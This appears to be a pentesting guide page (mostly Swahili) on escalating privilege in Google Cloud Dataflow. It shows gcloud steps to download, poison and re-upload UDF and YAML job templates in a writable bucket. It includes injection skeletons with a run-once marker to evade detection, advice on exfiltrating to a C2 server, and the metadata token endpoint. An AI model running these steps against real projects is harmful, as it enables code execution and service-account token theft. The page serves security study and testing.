# GCP - Dataflow Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow haithamini uhalali wa UDFs na job template YAMLs zilizohifadhiwa katika GCS.
Kwa kuwa na ufikiaji wa kuandika kwenye bucket, unaweza kuandika tena faili hizi ili kuingiza code, kutekeleza code kwenye workers, kuiba service account tokens, au kubadilisha usindikaji wa data.
Pipelines za batch na streaming zote ni malengo yanayoweza kushambuliwa kwa njia hii. Ili kutekeleza shambulio kwenye pipeline tunahitaji kubadilisha UDFs/templates kabla job ianze, katika dakika chache za mwanzo (kabla workers wa job kuundwa) au wakati job inakimbia kabla workers wapya kuanzishwa (kutokana na autoscaling).

**Attack vectors:**
- **UDF hijacking:** Python (`.py`) na JS (`.js`) UDFs zinazotajwa na pipelines na kuhifadhiwa katika customer-managed buckets
- **Job template hijacking:** Custom YAML pipeline definitions zilizohifadhiwa katika customer-managed buckets


> [!WARNING]
> **Run-once-per-worker trick:** Dataflow UDFs na template callables zinaitwa **per row/line**. Bila uratibu, exfiltration au token theft itafanya kazi maelfu ya nyakati, ikasababisha noise, rate limiting, na kugunduliwa. Tumia muundo wa **file-based coordination**: angalia kama marker file (k.m. `/tmp/pwnd.txt`) ipo mwanzoni; ikiwa ipo, ruka malicious code; ikiwa haipo, endesha payload na unda file. Hii inahakikisha payload inaendeshwa **mara moja kwa worker**, sio kwa kila line.


#### Direct exploitation via gcloud CLI

1. Enumerate Dataflow jobs and locate the template/UDF GCS paths:

<details>

<summary>List jobs and describe to get template path, staging location, and UDF references</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. Pakua UDF ya asili au kiolezo cha kazi kutoka GCS:

<details>

<summary>Pakua faili la UDF au kiolezo la YAML kutoka bucket</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. Hariri faili kwa lokali: weka payload hasidi (tazama Python UDF au vipande vya YAML hapa chini) na hakikisha muundo wa uratibu wa run-once unatumiwa.

4. Pakia tena ili kuandika juu ya faili ya asili:

<details>

<summary>Pakia tena UDF au template kwenye bucket</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. Subiri kazi ijayo ianze, au (kwa streaming) chochea autoscaling (kwa mfano: jaza input ya pipeline) ili workers wapya waanze na kupakua faili iliyobadilishwa.

#### Python UDF injection

Ikiwa unataka worker i-exfiltrate data kwa C2 server yako, tumia `urllib.request` na si `requests`.
`requests` haijasakinishwa kwenye classic Dataflow workers.

<details>

<summary>Malicious UDF with run-once coordination and metadata extraction</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### Kuingizwa kwa YAML kwenye kiolezo la kazi

Ingiza hatua ya `MapToFields` yenye callable inayotumia faili la uratibu. Kwa pipelines zinazotegemea YAML zinazounga mkono `requests`, itumie ikiwa kiolezo kinatangaza `dependencies: [requests]`; vinginevyo pendelea `urllib.request`.

Ongeza hatua ya kusafisha (`drop: [malicious_step]`) ili pipeline iendelee kuandika data halali kwa lengo.

<details>

<summary>Hatua ya MapToFields yenye madhara na usafishaji katika pipeline YAML</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Ufikiaji wa Compute Engine kwa Dataflow Workers

**Ruhusa:** `compute.instances.osLogin` au `compute.instances.osAdminLogin` (na `iam.serviceAccounts.actAs` juu ya worker SA), au `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata` (na `iam.serviceAccounts.actAs`) kwa ajili ya urithi wa zamani wa injection ya SSH key

Dataflow workers huendeshwa kama VMs za Compute Engine. Ufikiaji kwa workers kupitia OS Login au SSH unakuwezesha kusoma SA tokens kutoka kwenye metadata endpoint (`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`), kudhibiti/kuhariri data, au kuendesha arbitrary code.

For exploitation details, see:
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) â€” `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## Marejeo

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
